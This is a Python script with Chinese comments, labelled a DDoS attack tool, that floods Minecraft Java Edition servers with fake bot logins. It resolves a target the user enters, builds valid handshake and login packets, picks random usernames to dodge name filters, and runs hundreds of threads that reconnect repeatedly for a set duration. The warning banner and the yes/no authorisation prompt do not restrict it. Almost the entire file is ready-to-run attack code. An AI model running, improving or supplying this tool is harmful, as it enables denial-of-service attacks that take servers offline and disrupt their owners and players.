import sys
import os
import time
import socket
import ipaddress
import random
import struct
import threading

# ==================== 跨平台清屏函数 ====================
def clear_screen():
    # 清屏，兼容 Windows (cls) 和 Unix-like (clear)
    os.system("cls" if os.name == "nt" else "clear")


# ==================== 启动艺术字与法律警告 ====================

clear_screen()
print("MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM   Sucodesu")
print("M       MMM M       MMM MMM     MMM MM       MM   Sucodesu")
print("M  MMMM   M M  MMMM   M M   MMM   M M  MMMMM  M   Sucodesu")
print("M  MMMMM  M M  MMMMM  M M  MMMMM  M M        MM   Sucodesu")
print("M  MMMMM  M M  MMMMM  M M  MMMMM  M MMMMMMM   M   Sucodesu")
print("M  MMMM   M M  MMMM   M M   MMM   M M   MMM   M   Sucodesu")
print("M        MM M        MM MMM     MMM MM       MM   Sucodesu")
print("MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM   Sucodesu")
print("========================= 严重警告 =========================")
print("你已经触碰到了法律底线和道德边界，请立即退出，或等待3秒")
print("===========================================================")
time.sleep(1)
print("3")
time.sleep(1)
print("2")
time.sleep(1)
print("1")
time.sleep(1)
print("Starting...")
time.sleep(1)

clear_screen()
print(r" ____  ____   ___  ____          _   _   _             _     ")
print(r"|  _ \|  _ \ / _ \/ ___|        / \ | |_| |_ __ _  ___| | __ ")
print(r"| | | | | | | | | \___ \ _____ / _ \| __| __/ _` |/ __| |/ / ")
print(r"| |_| | |_| | |_| |___) |_____/ ___ \ |_| || (_| | (__|   <  ")
print(r"|____/|____/ \___/|____/     /_/   \_\__|\__\__,_|\___|_|\_\ ")
print("Author  : Su-StackTrace")
print("GitHub  : https://github.com/BC-809/DDoS-Attack_t3g85hxb670.git")
print("")
print("Minecraft Java Edition 假人攻击")
print("")

# ==================== 参数输入 ====================

# 目标地址输入 (支持 domain:port 或 ip:port)
while True:
    addr_str = input("[?] 目标服务器地址 (例如 play.example.com:25565): ").strip()
    if not addr_str:
        print("[!] 地址不能为空。")
        continue
    # 分离域名和端口
    if ":" in addr_str:
        try:
            host, port_str = addr_str.rsplit(":", 1)
            target_port = int(port_str)
        except ValueError:
            print("[!] 端口格式错误，请使用 域名:端口 的格式。")
            continue
    else:
        host = addr_str
        target_port = 25565  # Minecraft 默认端口
    if not 1 <= target_port <= 65535:
        print("[!] 端口必须在 1-65535 之间。")
        continue
    # 尝试解析域名，同时保存主机名用于Handshake包
    try:
        addr_info = socket.getaddrinfo(host, target_port, proto=socket.IPPROTO_TCP)
        target_ip = addr_info[0][4][0]  # 取第一个IP
        print(f"[>] 解析成功: {host} -> {target_ip}:{target_port}")
        break
    except socket.gaierror as e:
        print(f"[!] 域名解析失败: {e}")
        continue

# 攻击参数
while True:
    try:
        threads_str = input("[?] 攻击线程数 (建议 100-500): ").strip()
        threads_count = int(threads_str)
        if threads_count <= 0:
            print("[!] 线程数必须大于0。")
            continue
        break
    except ValueError:
        print("[!] 请输入有效整数。")

while True:
    try:
        duration_str = input("[?] 攻击持续时间 (秒): ").strip()
        duration = float(duration_str)
        if duration <= 0:
            print("[!] 持续时间必须大于0。")
            continue
        break
    except ValueError:
        print("[!] 请输入有效数字。")

# 连接速率 (每线程每秒新建连接数)
conn_rate = 10.0
try:
    rate_str = input(f"[?] 每线程每秒连接数 (默认 {conn_rate}): ").strip()
    if rate_str:
        conn_rate = float(rate_str)
except ValueError:
    conn_rate = 10.0

# 配置摘要 (用户选择的选项，用 [*])
print(f"\n[*] 攻击目标: {host} ({target_ip}:{target_port})")
print(f"[*] 线程数: {threads_count}")
print(f"[*] 持续时间: {duration} 秒")
print(f"[*] 每线程每秒连接数: {conn_rate}")

# ==================== Minecraft 协议包构造 ====================

# 协议版本 (1.18.1 = 757, 1.19 = 759, 1.20.4 = 765) 使用757较常见
PROTOCOL_VERSION = 757

# 假人用户名池 (随机化，避免固定 "Bot" 被服务器直接过滤)
FAKE_NAMES = [
    "Steve", "Alex", "Notch", "Herobrine", "Dream", "Techno",
    "Tommy", "Tubbo", "Ranboo", "Purpled", "George", "Sapnap",
    "Karl", "Quackity", "Wilbur", "Philza", "Skeppy", "BBH",
    "Antfrost", "Punz", "Sam", "Foolish", "Eret", "Niki",
    "Jack", "Connor", "Slime", "Ludwig", "Ninja", "Shroud",
]

def random_bot_name():
    # 生成随机假人用户名
    return f"{random.choice(FAKE_NAMES)}{random.randint(1, 9999)}"

def create_handshake_packet(host, port, next_state=2):
    # 构造 Minecraft Handshake 数据包
    # next_state: 1 = status, 2 = login
    host_bytes = host.encode('utf-8')
    packet = bytearray()
    packet.append(0x00)  # Packet ID
    packet.extend(encode_varint(PROTOCOL_VERSION))
    packet.extend(encode_string(host_bytes))
    packet.extend(struct.pack('>H', port))
    packet.extend(encode_varint(next_state))
    return pack_mc_frame(bytes(packet))

def create_login_start_packet(username):
    # 构造 Login Start 数据包
    packet = bytearray()
    packet.append(0x00)  # Packet ID
    packet.extend(encode_string(username.encode('utf-8')))
    return pack_mc_frame(bytes(packet))

def encode_varint(value):
    # 将整数编码为 Minecraft VarInt
    buf = bytearray()
    while True:
        temp = value & 0x7f
        value >>= 7
        if value != 0:
            temp |= 0x80
        buf.append(temp)
        if value == 0:
            break
    return bytes(buf)

def encode_string(data: bytes):
    # 将字节串编码为 Minecraft 字符串 (长度前缀+内容)
    length = encode_varint(len(data))
    return bytes(length) + data

def pack_mc_frame(packet_data: bytes):
    # 为数据包添加 Minecraft 帧长度前缀 (VarInt)
    length = encode_varint(len(packet_data))
    return bytes(length) + packet_data

# ==================== 攻击线程与统计 ====================

stop_event = threading.Event()

# 全局统计 (线程安全)
stats_lock = threading.Lock()
stats = {
    "success": 0,     # 成功建立连接并发送数据包的次数
    "failed": 0,      # 失败次数
    "bytes": 0,       # 已发送字节数
}

def attack_thread(host, port, ip, rate):
    # 单个攻击线程，循环建立TCP连接发送假人登录包
    sock = None
    while not stop_event.is_set():
        try:
            # 创建TCP连接
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((ip, port))
            # 构造并发送 Handshake + Login Start
            username = random_bot_name()
            handshake = create_handshake_packet(host, port, 2)
            login_start = create_login_start_packet(username)
            payload = handshake + login_start
            sock.send(payload)
            # 更新统计
            with stats_lock:
                stats["success"] += 1
                stats["bytes"] += len(payload)
            # 保持连接一小段时间后关闭
            time.sleep(0.1)
        except Exception:
            with stats_lock:
                stats["failed"] += 1
        finally:
            if sock:
                try:
                    sock.close()
                except Exception:
                    pass
            # 控制连接速率
            time.sleep(1.0 / rate if rate > 0 else 0.1)

# ==================== 最终确认 ====================

print("\n[!] 最后警告：你即将对目标 Minecraft 服务器发动假人攻击。")
while True:
    confirm = input("[?] 请确认这是你拥有合法授权的服务器 (yes/no): ").strip().lower()
    if confirm == 'yes':
        break
    elif confirm == 'no':
        print("[>] 用户取消。")
        sys.exit(0)
    else:
        print("[!] 请输入 yes 或 no。")

# ==================== 启动攻击 ====================

print(f"\n[>] 正在启动 {threads_count} 个攻击线程...")
threads = []
for _ in range(threads_count):
    t = threading.Thread(target=attack_thread, args=(host, target_port, target_ip, conn_rate))
    t.daemon = True
    t.start()
    threads.append(t)

print(f"[>] 攻击已开始，持续 {duration} 秒。按 Ctrl+C 提前停止...")

start_time = time.time()
try:
    # 主线程周期性输出统计
    while time.time() - start_time < duration:
        time.sleep(5)
        elapsed = time.time() - start_time
        with stats_lock:
            s = stats["success"]
            f = stats["failed"]
            b = stats["bytes"]
        print(f"[>] 已运行 {elapsed:.0f}s | 成功: {s} | 失败: {f} | 数据: {b / 1024:.1f} KB")
except KeyboardInterrupt:
    print("\n[!] 收到中断信号。")
finally:
    stop_event.set()
    print("[>] 正在等待所有线程退出...")
    for t in threads:
        t.join(timeout=2)

    # 最终统计
    elapsed = time.time() - start_time
    with stats_lock:
        s = stats["success"]
        f = stats["failed"]
        b = stats["bytes"]
    print(f"\n[>] 攻击结束。总连接尝试: {s + f} | 成功: {s} | 失败: {f} | "
          f"数据: {b / 1024:.1f} KB | 耗时: {elapsed:.2f}s")
